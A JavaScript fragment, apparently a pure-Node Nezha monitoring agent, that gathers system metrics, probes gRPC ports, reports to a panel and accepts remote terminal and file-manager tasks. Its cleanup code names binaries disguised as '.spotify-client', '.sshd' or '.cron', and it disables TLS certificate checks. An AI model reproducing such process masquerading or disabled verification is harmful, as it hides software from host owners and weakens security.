            for (const m of altMounts) {
                try {
                    if (fs.existsSync(m)) {
                        const stat = fs.statfsSync(m);
                        const total = stat.blocks * stat.bsize;
                        if (total > diskTotal) { diskTotal = total; diskUsed = (stat.blocks - stat.bfree) * stat.bsize; }
                    }
                } catch(e) {}
            }
        }
        return { diskTotal, diskUsed };
    },
    async collectHost(forceRefresh = false) {
        const now = Date.now();
        if (!forceRefresh && this._hostCache && (now - this._hostCacheTime) < this._hostCacheTTL) {
            return this._hostCache;
        }
        const isWin = os.platform() === 'win32';
        let cpuInfo = [];
        try {
            const cpus = os.cpus();
            const cpuModelSet = new Set(cpus.map(c => c.model));
            cpuInfo = [...cpuModelSet];
        } catch(e) {}
        let diskTotal = 0, swapTotal = 0;
        try {
            if (!isWin) {
                try {
                    const mountInfo = fsSync.readFileSync('/proc/mounts', 'utf8');
                    const rootLine = mountInfo.split('\n').find(l => l.split(' ')[1] === '/');
                    if (rootLine) {
                        const devName = rootLine.split(' ')[0];
                    }
                } catch(e) {}
                try {
                    const statBuf = fsSync.readFileSync('/proc/1/mountinfo', 'utf8');
                    const rootEntry = statBuf.split('\n').find(l => l.includes(' / '));

                } catch(e) {}
                try {
                    const meminfo = fsSync.readFileSync('/proc/meminfo', 'utf8');
                    const swapMatch = meminfo.match(/SwapTotal:\s+(\d+)/);
                    if (swapMatch) swapTotal = parseInt(swapMatch[1]) * 1024;
                } catch(e) {}
            }
        } catch(e) {}
        let virtualization = '';
        try {
            if (!isWin) {
                try {
                    const cgroup = fsSync.readFileSync('/proc/1/cgroup', 'utf8');
                    if (cgroup.includes('docker') || cgroup.includes('/docker/')) virtualization = 'docker';
                    else if (cgroup.includes('lxc')) virtualization = 'lxc';
                    else if (cgroup.includes('kubepods')) virtualization = 'kvm';
                } catch(e) {}
                if (!virtualization) {
                    try {
                        if (fsSync.existsSync('/.dockerenv')) virtualization = 'docker';
                    } catch(e) {}
                }
                if (!virtualization) {
                    try {
                        if (fsSync.existsSync('/run/.containerenv')) virtualization = 'docker';
                    } catch(e) {}
                }
                if (!virtualization) {
                    try {
                        const product = fsSync.readFileSync('/sys/class/dmi/id/product_name', 'utf8').trim();
                        if (product.toLowerCase().includes('kvm') || product.toLowerCase().includes('qemu')) virtualization = 'kvm';
                        else if (product.toLowerCase().includes('vmware')) virtualization = 'vmware';
                        else if (product.toLowerCase().includes('virtualbox')) virtualization = 'virtualbox';
                        else if (product.toLowerCase().includes('xen')) virtualization = 'xen';
                        else if (product.toLowerCase().includes('hyper-v')) virtualization = 'hyper-v';
                    } catch(e2) {}
                }
                if (!virtualization) {
                    try {
                        const cpuinfo = fsSync.readFileSync('/proc/cpuinfo', 'utf8');
                        if (cpuinfo.includes('hypervisor')) virtualization = 'kvm';
                    } catch(e) {}
                }
                if (!virtualization) {
                    try {
                        const modules = fsSync.readFileSync('/proc/modules', 'utf8');
                        if (modules.match(/^kvm\s/m)) virtualization = 'kvm';
                        else if (modules.includes('hv_util')) virtualization = 'hyperv';
                        else if (modules.includes('vboxdrv')) virtualization = 'virtualbox';
                        else if (modules.includes('vboxguest')) virtualization = 'virtualbox';
                        else if (modules.match(/^vmware\s/m)) virtualization = 'vmware';
                    } catch(e) {}
                }
                if (!virtualization) {
                    try {
                        const env1 = fsSync.readFileSync('/proc/1/environ', 'utf8');
                        if (env1.includes('container=lxc')) virtualization = 'lxc';
                    } catch(e) {}
                }
                if (!virtualization) {
                    try {
                        if (fsSync.existsSync('/proc/xen')) virtualization = 'xen';
                    } catch(e) {}
                }
                if (!virtualization) virtualization = 'unknown';
            }
        } catch(e) { virtualization = 'unknown'; }
        let bootTime = 0;
        try {
            if (!isWin) {
                let isDocker = false;
                try { if (fsSync.existsSync('/.dockerenv')) isDocker = true; } catch(e) {}
                if (!isDocker) {
                    try {
                        const cgroup = fsSync.readFileSync('/proc/1/cgroup', 'utf8');
                        if (cgroup.includes('docker') || cgroup.includes('/docker/')) isDocker = true;
                    } catch(e) {}
                }
                if (!isDocker) {
                    const procStat = fsSync.readFileSync('/proc/stat', 'utf8');
                    const btimeMatch = procStat.match(/btime\s+(\d+)/);
                    if (btimeMatch) bootTime = parseInt(btimeMatch[1]);
                }
                if (!bootTime) {
                    bootTime = Math.floor(Date.now() / 1000 - os.uptime());
                }
            }
        } catch(e) {
            bootTime = Math.floor(Date.now() / 1000 - os.uptime());
        }
        if (!diskTotal) {
            ({ diskTotal } = this._getDiskCapacity());
        }
        let publicIP = await this.getPublicIP();
        if (publicIP && /^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/.test(publicIP) && publicIP !== nezhaConfig._sourceIP) {
            nezhaConfig._sourceIP = publicIP;
            saveNezhaConfig().catch(() => {});
        }
        let memTotalValue = os.totalmem();
        let archValue = '';
        try {
            if (!isWin) {
                archValue = execSync('uname -m 2>/dev/null', { encoding: 'utf8' }).trim();
            } else {
                const winArch = (process.env.PROCESSOR_ARCHITECTURE || '').toUpperCase();
                if (winArch === 'AMD64') archValue = 'x86_64';
                else if (winArch === 'ARM64') archValue = 'aarch64';
                else if (winArch === 'IA64') archValue = 'ia64';
                else if (winArch === 'X86' || winArch === 'X86') archValue = 'i686';
                else archValue = os.arch();
            }
        } catch(e) { archValue = os.arch(); }
        if (!archValue) {
            const nodeArch = os.arch();
            if (nodeArch === 'x64') archValue = 'x86_64';
            else if (nodeArch === 'arm64') archValue = 'aarch64';
            else if (nodeArch === 'arm') archValue = 'armv7l';
            else if (nodeArch === 'ia32') archValue = 'i386';
            else archValue = nodeArch;
        }
        let gpuInfo = [];
        try {
            if (!isWin) {
                try {
                    const smi = execSync('nvidia-smi --query-gpu=name --format=csv,noheader 2>/dev/null', { encoding: 'utf8', timeout: 5000 }).trim();
                    if (smi) gpuInfo = smi.split('\n').map(s => s.trim()).filter(s => s.length > 0);
                } catch(e) {}
                if (gpuInfo.length === 0) {
                    try {
                        const drmDir = '/sys/class/drm';
                        if (fsSync.existsSync(drmDir)) {
                            const devs = fsSync.readdirSync(drmDir);
                            for (const d of devs) {
                                try {
                                    const deviceDir = path.join(drmDir, d, 'device');
                                    if (fsSync.existsSync(deviceDir)) {
                                        const uevent = fsSync.readFileSync(path.join(deviceDir, 'uevent'), 'utf8');
                                        const pciMatch = uevent.match(/PCI_ID=([\w:]+)/);
                                        if (pciMatch) gpuInfo.push(d + '(' + pciMatch[1] + ')');
                                    }
                                } catch(e) {}
                            }
                        }
                    } catch(e) {}
                }
            }
        } catch(e) {}
        let platformName = os.type();
        let platformVersion = os.release();
        try {
            if (!isWin) {
                const osRelease = fsSync.readFileSync('/etc/os-release', 'utf8');
                const idMatch = osRelease.match(/^ID=(.+)$/m);
                const verMatch = osRelease.match(/^VERSION_ID=(.+)$/m);
                if (idMatch) platformName = idMatch[1].trim().replace(/^["']|["']$/g, '');
                if (verMatch) platformVersion = verMatch[1].trim().replace(/^["']|["']$/g, '');
            }
        } catch(e) {}
        const result = {
            platform: platformName,
            platformVersion: platformVersion,
            cpu: cpuInfo,
            memTotal: memTotalValue,
            diskTotal: diskTotal,
            swapTotal: swapTotal,
            arch: archValue,
            virtualization: virtualization,
            bootTime: bootTime || Math.floor(Date.now() / 1000 - os.uptime()),
            version: '2.2.2',
            gpu: gpuInfo,
            ip: publicIP,
        };
        this._hostCache = result;
        this._hostCacheTime = Date.now();
        return result;
    },
    async collectState() {
        const isWin = os.platform() === 'win32';
        let cpuPercent = 0;
        try {
            if (!isWin) {
                const procStat = fsSync.readFileSync('/proc/stat', 'utf8');
                const cpuLine = procStat.split('\n')[0];
                const fields = cpuLine.match(/cpu\s+(.*)/);
                if (fields) {
                    const v = fields[1].trim().split(/\s+/).map(Number);
                    const user = v[0] || 0, nice = v[1] || 0, system = v[2] || 0;
                    const idle = v[3] || 0, iowait = v[4] || 0, irq = v[5] || 0;
                    const softirq = v[6] || 0, steal = v[7] || 0;
                    const guest = v[8] || 0, guestNice = v[9] || 0;
                    let total = user + nice + system + idle + iowait + irq + softirq + steal + guest + guestNice;
                    total -= guest + guestNice;
                    const busy = total - idle - iowait;
                    if (nezhaPurePrevCpuTotal !== undefined && nezhaPurePrevCpuTotal > 0) {
                        const totalDiff = total - nezhaPurePrevCpuTotal;
                        const busyDiff = busy - nezhaPurePrevCpuBusy;
                        if (totalDiff > 0) cpuPercent = Math.max(0, Math.min(100, (busyDiff / totalDiff) * 100));
                    }
                    nezhaPurePrevCpuTotal = total;
                    nezhaPurePrevCpuBusy = busy;
                }
            } else {
                const cpus = os.cpus();
                if (nezhaPurePrevCpus) {
                    let totalDiff = 0, idleDiff = 0;
                    for (let i = 0; i < cpus.length; i++) {
                        const prev = nezhaPurePrevCpus[i], curr = cpus[i];
                        if (!prev || !prev.times) continue;
                        totalDiff += Object.values(curr.times).reduce((a, b) => a + b, 0) - Object.values(prev.times).reduce((a, b) => a + b, 0);
                        idleDiff += (curr.times.idle || 0) - (prev.times.idle || 0);
                    }
                    if (totalDiff > 0) cpuPercent = Math.max(0, Math.min(100, ((totalDiff - idleDiff) / totalDiff) * 100));
                }
                nezhaPurePrevCpus = cpus;
            }
        } catch(e) {}
        let memTotal = os.totalmem();
        let memUsed = memTotal - os.freemem();
        let swapUsed = 0, swapTotal = 0;
        try {
            if (!isWin) {
                const meminfo = fsSync.readFileSync('/proc/meminfo', 'utf8');
                const memTotalMatch = meminfo.match(/MemTotal:\s+(\d+)/);
                const memAvailMatch = meminfo.match(/MemAvailable:\s+(\d+)/);
                if (memTotalMatch) memTotal = parseInt(memTotalMatch[1]) * 1024;
                if (memAvailMatch) {
                    memUsed = memTotal - parseInt(memAvailMatch[1]) * 1024;
                } else {
                    const memFreeMatch = meminfo.match(/MemFree:\s+(\d+)/);
                    const buffersMatch = meminfo.match(/Buffers:\s+(\d+)/);
                    const cachedMatch = meminfo.match(/Cached:\s+(\d+)/);
                    const sReclaimableMatch = meminfo.match(/SReclaimable:\s+(\d+)/);
                    let available = parseInt(memFreeMatch?.[1]) || 0;
                    available += parseInt(buffersMatch?.[1]) || 0;
                    available += parseInt(cachedMatch?.[1]) || 0;
                    available += parseInt(sReclaimableMatch?.[1]) || 0;
                    memUsed = Math.max(0, memTotal - available * 1024);
                }
                const swFree = parseInt(meminfo.match(/SwapFree:\s+(\d+)/)?.[1]) || 0;
                const swTotal = parseInt(meminfo.match(/SwapTotal:\s+(\d+)/)?.[1]) || 0;
                swapTotal = swTotal * 1024;
                swapUsed = (swTotal - swFree) * 1024;
            }
        } catch(e) {}
        let diskUsed = 0, diskTotal = 0;
        try {
            if (!isWin) {
                ({ diskTotal, diskUsed } = this._getDiskCapacity());
            }
        } catch(e) {}
        let netInTransfer = 0, netOutTransfer = 0, netInSpeed = 0, netOutSpeed = 0;
        try {
            if (!isWin) {
                const netDev = fsSync.readFileSync('/proc/net/dev', 'utf8');
                const lines = netDev.split('\n').slice(2);
                for (const line of lines) {
                    const match = line.trim().match(/^\s*([^:]+):\s*(\d+)\s+\d+\s+\d+\s+\d+\s+\d+\s+\d+\s+\d+\s+\d+\s+(\d+)/);
                    if (match && !['lo', 'tun', 'docker', 'veth', 'br-', 'vmbr', 'vnet', 'kube', 'Meta', 'tailscale', 'fw', 'tap'].some(skip => match[1].trim().startsWith(skip))) {
                        netInTransfer += parseInt(match[2]) || 0;
                        netOutTransfer += parseInt(match[3]) || 0;
                    }
                }
                const now = Date.now();
                if (nezhaPureLastNetTime > 0 && now > nezhaPureLastNetTime) {
                    const elapsed = (now - nezhaPureLastNetTime) / 1000;
                    netInSpeed = Math.max(0, (netInTransfer - nezhaPureLastNetIn) / elapsed);
                    netOutSpeed = Math.max(0, (netOutTransfer - nezhaPureLastNetOut) / elapsed);
                }
                nezhaPureLastNetIn = netInTransfer;
                nezhaPureLastNetOut = netOutTransfer;
                nezhaPureLastNetTime = now;
            }
        } catch(e) {}
        let tcpConnCount = 0, udpConnCount = 0;
        try {
            if (!isWin) {
                for (const tcpFile of ['/proc/net/tcp', '/proc/net/tcp6']) {
                    try {
                        const data = fsSync.readFileSync(tcpFile, 'utf8');
                        const lines = data.split('\n').slice(1);
                        for (const line of lines) {
                            const parts = line.trim().split(/\s+/);
                            if (parts.length >= 4 && parts[3] === '01') tcpConnCount++;
                        }
                    } catch(e) {}
                }
                for (const udpFile of ['/proc/net/udp', '/proc/net/udp6']) {
                    try {
                        const data = fsSync.readFileSync(udpFile, 'utf8');
                        const lines = data.split('\n').slice(1);
                        for (const line of lines) {
                            const parts = line.trim().split(/\s+/);
                            if (parts.length >= 4 && parts[3] !== undefined) udpConnCount++;
                        }
                    } catch(e) {}
                }
            }
        } catch(e) {}
        let processCount = 0;
        try {
            if (!isWin) {
                const procEntries = fsSync.readdirSync('/proc');
                for (const entry of procEntries) {
                    if (/^\d+$/.test(entry)) processCount++;
                }
            }
        } catch(e) {}
        const loadAvg = os.loadavg();
        return {
            cpu: cpuPercent,
            memUsed: memUsed,
            swapUsed: swapUsed,
            diskUsed: diskUsed,
            netInTransfer: netInTransfer,
            netOutTransfer: netOutTransfer,
            netInSpeed: netInSpeed,
            netOutSpeed: netOutSpeed,
            uptime: Math.floor(os.uptime()),
            load1: loadAvg[0],
            load5: loadAvg[1],
            load15: loadAvg[2],
            tcpConnCount: tcpConnCount,
            udpConnCount: udpConnCount,
            processCount: processCount,
            gpu: [],
        };
    }
};

function nezhaPureSendUnary(h2session, path, msgBuf, authHeaders) {
    return new Promise((resolve, reject) => {
        const headers = {
            ':method': 'POST',
            ':path': path,
            'content-type': 'application/grpc',
            'te': 'trailers',
            'grpc-encoding': 'identity',
            'grpc-accept-encoding': 'identity',
            'user-agent': 'nezha-agent/2.2.2',
            ...authHeaders,
        };
        const req = h2session.request(headers);
        const respChunks = [];
        let resolved = false;
        req.on('response', (hdrs) => {
            const httpStatus = parseInt(hdrs[':status']);
            if (httpStatus && httpStatus !== 200) {
                if (httpStatus === 530 || hdrs['server'] === 'cloudflare') {
                    const errMsg = `HTTP ${httpStatus} — gRPC 被 Cloudflare 拦截! 请在 Cloudflare 面板开启 gRPC 支持(Rules→gRPC)，或使用不走CDN的直连地址`;
                    if (!resolved) { resolved = true; reject(new Error(errMsg)); }
                    return;
                }
                if (!resolved) { resolved = true; reject(new Error(`HTTP ${httpStatus}: 非 gRPC 响应，请检查面板地址和端口`)); }
                return;
            }
        });
        req.on('data', (chunk) => {
            if (resolved) return;
            respChunks.push(chunk);
        });
        req.on('trailers', (trailers) => {
            if (resolved) return;
            resolved = true;
            const status = trailers['grpc-status'];
            if (status && status !== '0') {
                reject(new Error(`gRPC error ${status}: ${trailers['grpc-message'] || 'unknown'}`));
            } else {
                const fullBuf = Buffer.concat(respChunks);
                const frames = PB.unframe(fullBuf);
                resolve(frames.length > 0 ? frames[0] : null);
            }
        });
        req.on('error', (err) => {
            if (!resolved) { resolved = true; reject(err); }
        });
        req.end(PB.frame(msgBuf));
        setTimeout(() => {
            if (!resolved) {
                resolved = true;
                req.close(require('http2').constants.HTTP2_STREAM_CANCEL);
                reject(new Error('gRPC unary 请求超时(15s)'));
            }
        }, 15000);
    });
}

function nezhaPureOpenStream(h2session, path, authHeaders, onData, onEnd) {
    const headers = {
        ':method': 'POST',
        ':path': path,
        'content-type': 'application/grpc',
        'te': 'trailers',
        'grpc-encoding': 'identity',
        'grpc-accept-encoding': 'identity',
        'user-agent': 'nezha-agent/2.2.2',
        ...authHeaders,
    };
    const stream = h2session.request(headers);
    let streamBroken = false;
    stream.on('response', (hdrs) => {
        const httpStatus = parseInt(hdrs[':status']);
        if (httpStatus && httpStatus !== 200) {
            streamBroken = true;
            try { stream.end(); } catch(e) {}
            if (onEnd) onEnd({ error: new Error(`HTTP ${httpStatus}`), cloudflare: httpStatus === 530 });
        }
    });
    stream.on('data', (chunk) => {
        if (streamBroken) return;
        try {
            const frames = PB.unframe(chunk);
            frames.forEach(f => { if (onData) onData(f); });
        } catch(e) {}
    });
    stream.on('trailers', (trailers) => {
        if (streamBroken) return;
        const grpcStatus = trailers['grpc-status'];
        const grpcMsg = trailers['grpc-message'] || '';
        const isUniqueConstraint = grpcMsg.includes('UNIQUE constraint');
        if (grpcStatus && grpcStatus !== '0' && !(grpcStatus === '2' && grpcMsg === 'EOF') && !isUniqueConstraint) {
        }

        if (isUniqueConstraint) {
            return;
        }
        if (onEnd) onEnd(trailers);
    });
    stream.on('error', (err) => { if (onEnd) onEnd({ error: err }); });
    return stream;
}

const NEZHA_GRPC_PORT_CACHE = {};
function buildGrpcCandidates(originalPort, tls) {
    const candidates = [];

    candidates.push({ port: originalPort, useTls: tls, label: `用户指定 ${originalPort}/${tls ? 'TLS' : '明文'}` });
    if (originalPort !== 443 || !tls) {
        candidates.push({ port: 443, useTls: true, label: '443/TLS (云平台HTTPS)' });
    }
    if (originalPort !== 80 || tls) {
        candidates.push({ port: 80, useTls: false, label: '80/明文 (云平台HTTP)' });
    }
    candidates.push({ port: 443, useTls: true, label: '443/TLS (CF gRPC)' });
    candidates.push({ port: 2053, useTls: true, label: '2053/TLS (CF gRPC)' });
    candidates.push({ port: 8443, useTls: true, label: '8443/TLS (CF gRPC)' });
    const vpsPorts = [
        { port: 5555, useTls: false, label: '5555/明文 (哪吒默认gRPC)' },
        { port: 5555, useTls: true, label: '5555/TLS' },
        { port: 8008, useTls: false, label: '8008/明文' },
        { port: 8008, useTls: true, label: '8008/TLS' },
    ];
    for (const v of vpsPorts) {
        if (!candidates.some(c => c.port === v.port && c.useTls === v.useTls)) {
            candidates.push(v);
        }
    }
    return candidates;
}

function probeGrpcPort(host, port, useTls) {
    return new Promise((resolve) => {
        const h2 = require('http2');
        const url = useTls ? `https://${host}:${port}` : `http://${host}:${port}`;
        const h2Opts = useTls ? {
            rejectUnauthorized: false,
            settings: { enablePush: false },
        } : {
            settings: { enablePush: false },
        };
        const connectTimeout = 4000;
        const timer = setTimeout(() => {
            try { session.close(); } catch(e) {}
            resolve(false);
        }, connectTimeout);
        let settled = false;
        let session;
        try {
            session = h2.connect(url, h2Opts);
        } catch(e) {
            clearTimeout(timer);
            resolve(false);
            return;
        }
        session.on('connect', () => {
            if (settled) return; settled = true;
            clearTimeout(timer);
            try {
                const testStream = session.request({
                    ':method': 'POST',
                    ':path': '/proto.NezhaService/ReportSystemInfo',
                    'content-type': 'application/grpc',
                    'te': 'trailers',
                });
                const streamTimeout = setTimeout(() => {
                    try { testStream.close(http2.constants.HTTP2_STREAM_CANCEL); } catch(e) {}
                    try { session.close(); } catch(e) {}
                    resolve(true);
                }, 2000);
                testStream.on('response', (headers) => {
                    clearTimeout(streamTimeout);
                    const status = parseInt(headers[':status']) || 0;
                    if (status === 200 || status === 401 || status === 403) {
                        try { testStream.close(http2.constants.HTTP2_STREAM_CANCEL); } catch(e) {}
                        try { session.close(); } catch(e) {}
                        resolve(true);
                    } else {
                        try { testStream.close(http2.constants.HTTP2_STREAM_CANCEL); } catch(e) {}
                        try { session.close(); } catch(e) {}
                        resolve(false);
                    }
                });
                testStream.on('error', (err) => {
                    clearTimeout(streamTimeout);
                    const code = err.code || '';
                    if (code === 'ERR_HTTP2_STREAM_ERROR' || code === 'ECONNRESET' ||
                        err.message.includes('RST_STREAM') || err.message.includes('refused')) {
                        try { session.close(); } catch(e) {}
                        resolve(true);
                    } else {
                        try { session.close(); } catch(e) {}
                        resolve(false);
                    }
                });
                testStream.end(Buffer.from([0x00, 0x00, 0x00, 0x00, 0x00]));
            } catch(e) {
                try { session.close(); } catch(e2) {}
                resolve(false);
            }
        });
        session.on('error', (err) => {
            if (settled) return; settled = true;
            clearTimeout(timer);
            resolve(false);
        });
    });
}

async function detectGrpcPort(host, originalPort, tls) {
    const cacheKey = `${host}`;
    if (NEZHA_GRPC_PORT_CACHE[cacheKey]) {
        const cached = NEZHA_GRPC_PORT_CACHE[cacheKey];
        return cached;
    }

    const candidates = buildGrpcCandidates(originalPort, tls);
    for (const candidate of candidates) {
        try {
            const ok = await probeGrpcPort(host, candidate.port, candidate.useTls);
            if (ok) {
                const result = { port: candidate.port, tls: candidate.useTls };
                NEZHA_GRPC_PORT_CACHE[cacheKey] = result;
                return result;
            }
        } catch(e) {
        }
    }
    return { port: originalPort, tls: tls };
}

async function startNezhaPure(addr, key, tls = false) {
    if (nezhaPureRunning) stopNezhaPure();
    try {
        const isWin = os.platform() === 'win32';
        if (fsSync.existsSync(NEZHA_DIR)) {
            const filesToClean = fsSync.readdirSync(NEZHA_DIR);
            for (const f of filesToClean) {
                const fp = path.join(NEZHA_DIR, f);
                try {
                    if (f === 'nezha.zip' || f === '.runtime.lock' || f === 'config.yml' || f === '.config.yml') {
                        fsSync.unlinkSync(fp);
                    }
                } catch(e) {}
            }
        }
        if (!isWin && fsSync.existsSync(NEZHA_DIR)) {
            const binFiles = fsSync.readdirSync(NEZHA_DIR);
            const fakeNames = ['.music-player', '.spotify-client', '.netease-music', '.vlc-media', '.cmus-player',
                '.systemd-resolve', '.dbus-daemon', '.rsyslogd', '.sshd', '.cron'];
            for (const f of binFiles) {
                try {
                    if (fakeNames.includes(f) || f === 'nezha-agent') {
                        fsSync.unlinkSync(path.join(NEZHA_DIR, f));
                    }
                } catch(e) {}
            }
        }
    } catch(e) {
    }
    nezhaPureRunning = true;
    pushNezhaLog('🚀 纯Node探针启动中...', 'text-emerald-400 font-bold');
    let currentIP = nezhaConfig._sourceIP || '';
    if (!currentIP) {
        try { currentIP = await SysCollector.getPublicIP(); } catch(e) {}
    }
    let currentUUID = nezhaConfig.uuid || '';
    const needRegenerate = !currentUUID || currentUUID.trim() === '';
    if (needRegenerate && currentIP) {
        currentUUID = generateIPBasedUUID(currentIP);
        nezhaConfig.uuid = currentUUID;
        try { await saveNezhaConfig(); } catch(e) {}
    } else if (needRegenerate) {
        currentUUID = crypto.randomUUID();
        nezhaConfig.uuid = currentUUID;
        try { await saveNezhaConfig(); } catch(e) {}
    }

    const hostInfo = await SysCollector.collectHost();
    if (hostInfo.ip && hostInfo.ip !== nezhaConfig._sourceIP) {
        nezhaConfig._sourceIP = hostInfo.ip;
        const newUUID = generateIPBasedUUID(hostInfo.ip);
        if (newUUID !== nezhaConfig.uuid) {
            nezhaConfig.uuid = newUUID;
            currentUUID = newUUID;
        }
        try { await saveNezhaConfig(); } catch(e) {}
    }

    const addrParts = addr.split(':');
    const host = addrParts[0];
    const originalPort = parseInt(addrParts[1]) || (tls ? 443 : 5555);
    const detected = await detectGrpcPort(host, originalPort, tls);
    const port = detected.port;
    const useTls = detected.tls;

    const connectURL = useTls ? `https://${host}:${port}` : `http://${host}:${port}`;
    let currentAuthHeaders = {
        'client-secret': key,
        'client-uuid': currentUUID,
        'client_secret': key,
        'client_uuid': currentUUID,
    };
    const activeTerminals = new Map();
    const activeFMSessions = new Map();
    const fullReconnect = () => {
        cleanupSession();
        if (!nezhaPureRunning) return;
        nezhaRestartAttempts++;
        const firstRetryDelay = 3000;
        const baseDelay = nezhaRestartAttempts <= 1 ? firstRetryDelay : Math.min(NEZHA_RESTART_DELAY * Math.pow(2, Math.min(nezhaRestartAttempts - 2, 4)), NEZHA_RESTART_DELAY_MAX);
        const jitter = Math.floor(baseDelay * (0.7 + Math.random() * 0.6));
        nezhaPureReconnectTimer = setTimeout(() => {
            nezhaPureReconnectTimer = null;
            connectInternal();
        }, jitter);
    };
    const cleanupSession = () => {
        if (reopenTimer) { clearTimeout(reopenTimer); reopenTimer = null; }
        if (nezhaPurePingTimer) { clearTimeout(nezhaPurePingTimer); nezhaPurePingTimer = null; }
        if (nezhaPureGeoIPTimer) { clearTimeout(nezhaPureGeoIPTimer); nezhaPureGeoIPTimer = null; }
        if (nezhaPureStateTimer) { clearTimeout(nezhaPureStateTimer); nezhaPureStateTimer = null; }
        if (nezhaPureStateStream) { try { nezhaPureStateStream.end(); } catch(e) {} nezhaPureStateStream = null; }
        if (nezhaPureTaskStream) { try { nezhaPureTaskStream.end(); } catch(e) {} nezhaPureTaskStream = null; }
        if (nezhaPureH2Session) { try { nezhaPureH2Session.close(); } catch(e) {} nezhaPureH2Session = null; }

        for (const [id, term] of activeTerminals) {
            try { term.pty.kill(); } catch(e) {}
            if (term.keepaliveTimer) clearInterval(term.keepaliveTimer);
        }
        activeTerminals.clear();
        for (const [id, fm] of activeFMSessions) {
            if (fm.keepaliveTimer) clearInterval(fm.keepaliveTimer);
        }
        activeFMSessions.clear();
    };
    let reopenTimer = null;
    let reopenCount = 0;
    const reopenStreams = () => {
        if (!nezhaPureRunning) return;
        if (reopenTimer) return;
        reopenCount++;
        const backoff = reopenCount <= 1 ? 500 : Math.min(1000 * Math.pow(1.5, Math.min(reopenCount - 2, 6)), 15000);
        const jitter = Math.floor(Math.random() * 500);
        reopenTimer = setTimeout(() => {
            reopenTimer = null;
            if (!nezhaPureRunning || !nezhaPureH2Session || nezhaPureH2Session.destroyed || nezhaPureH2Session.closed) {
                fullReconnect();
                return;
            }
            if (nezhaPurePingTimer) { clearTimeout(nezhaPurePingTimer); nezhaPurePingTimer = null; }
            if (nezhaPureGeoIPTimer) { clearTimeout(nezhaPureGeoIPTimer); nezhaPureGeoIPTimer = null; }
            if (nezhaPureStateTimer) { clearTimeout(nezhaPureStateTimer); nezhaPureStateTimer = null; }
            if (nezhaPureStateStream) { try { nezhaPureStateStream.end(); } catch(e) {} nezhaPureStateStream = null; }
            if (nezhaPureTaskStream) { try { nezhaPureTaskStream.end(); } catch(e) {} nezhaPureTaskStream = null; }

            try {
            nezhaPureTaskStream = nezhaPureOpenStream(
                nezhaPureH2Session,
                '/proto.NezhaService/RequestTask',
                currentAuthHeaders,
                (frameData) => {
                    try {
                        let taskId = 0, taskType = 0, taskData = '';
                        let off = 0;
                        while (off < frameData.length) {
                            const tag = PB.decodeVarint(frameData, off);
                            off = tag.off;
                            const fieldNum = tag.val >> 3;
                            const wireType = tag.val & 0x07;
                            if (wireType === 0) {
                                const val = PB.decodeVarint(frameData, off);
                                off = val.off;
                                if (fieldNum === 1) taskId = val.val;
                                else if (fieldNum === 2) taskType = val.val;
                            } else if (wireType === 2) {
                                const len = PB.decodeVarint(frameData, off);
                                off = len.off;
                                const strBytes = frameData.slice(off, off + len.val);
                                off += len.val;
                                if (fieldNum === 3) taskData = strBytes.toString('utf8');
                            } else {
                                break;
                            }
                        }
                        if (taskType === 8) {
                            handleTerminalTask(taskId, taskData);
                        } else if (taskType === 11) {
                            handleFMTask(taskId, taskData);
                        } else if (taskType === 7) {
                        } else if (taskType >= 1 && taskType <= 6) {
                        }
                    } catch(e) {}
                },
                (trailers) => {
                    const grpcStatus = trailers && trailers['grpc-status'];

                    if (nezhaPureRunning) reopenStreams();
                }
            );
            nezhaPureTaskStream.write(PB.frame(Buffer.alloc(0)));
            nezhaPureStateStream = nezhaPureOpenStream(
                nezhaPureH2Session,
                '/proto.NezhaService/ReportSystemState',
                currentAuthHeaders,
                (frameData) => { /* Receipt, 忽略 */ },
                (trailers) => {
                    const grpcStatus = trailers && trailers['grpc-status'];

                    if (nezhaPureRunning) reopenStreams();
                }
            );
            startStateTimer(true, hostInfo, true);
        } catch(e) {}
        }, backoff + jitter);
    };
    const startStateTimer = (hostInfoReported = true, hostInfo = null, immediateFirst = true) => {
        if (nezhaPureStateTimer) clearTimeout(nezhaPureStateTimer);
        let _hostReported = hostInfoReported;
        const scheduleNext = (isFirst = false) => {
            const delay = (isFirst && immediateFirst) ? 0 : 4000;
            nezhaPureStateTimer = setTimeout(async () => {
                if (!nezhaPureRunning || !nezhaPureStateStream) return;
                try {
                    if (!_hostReported && hostInfo && nezhaPureH2Session && !nezhaPureH2Session.destroyed) {
                        try {
                            const hostBuf = NezhaMsg.encodeHost(hostInfo);
                            await nezhaPureSendUnary(nezhaPureH2Session, '/proto.NezhaService/ReportSystemInfo', hostBuf, currentAuthHeaders);
                            _hostReported = true;
                        } catch(retryErr) {
                        }
                    }
                    if (!nezhaPureH2Session || nezhaPureH2Session.destroyed || nezhaPureH2Session.closed) {
                        fullReconnect();
                        return;
                    }
                    if (!nezhaPureStateStream || nezhaPureStateStream.destroyed || nezhaPureStateStream.closed) {
                        reopenStreams();
                        return;
                    }
                    const state = await SysCollector.collectState();
                    const stateBuf = NezhaMsg.encodeState(state);
                    const writeOk = nezhaPureStateStream.write(PB.frame(stateBuf));
                    if (!writeOk) {
                        const drainTimeout = setTimeout(() => {
                            reopenStreams();
                        }, 5000);
                        nezhaPureStateStream.once('drain', () => {
                            clearTimeout(drainTimeout);
                        });
                    }
                } catch(e) {}
                scheduleNext(false);
            }, delay);
        };
        scheduleNext(true);
    };
    const startPingTimer = () => {
        if (nezhaPurePingTimer) clearTimeout(nezhaPurePingTimer);
        const schedulePing = () => {
            const jitter = Math.floor(Math.random() * 2000);
            nezhaPurePingTimer = setTimeout(() => {
                if (!nezhaPureH2Session || nezhaPureH2Session.destroyed || nezhaPureH2Session.closed) return;
                try {
                    const pingData = Buffer.alloc(8);
                    pingData.writeUInt32BE(process.uptime() >>> 0, 0);
                    pingData.writeUInt32BE(Date.now() >>> 0, 4);
                    nezhaPureH2Session.ping(pingData, (err, duration) => {
                        if (err) {
                            fullReconnect();
                        }
                    });
                } catch(e) {
                    fullReconnect();
                }
                schedulePing();
            }, 8000 + jitter);
        };
        schedulePing();
    };
    const startGeoIPTimer = () => {
        if (nezhaPureGeoIPTimer) clearTimeout(nezhaPureGeoIPTimer);
        const scheduleGeoIP = () => {
            const delay = timeToMs(0, 8 + Math.floor(Math.random() * 4));
            nezhaPureGeoIPTimer = setTimeout(async () => {
                if (!nezhaPureRunning || !nezhaPureH2Session || nezhaPureH2Session.destroyed) return;
                try {
                    const ipv4 = hostInfo.ip || '';
                    if (ipv4) {
                        const geoipBuf = NezhaMsg.encodeGeoIP(ipv4, '');
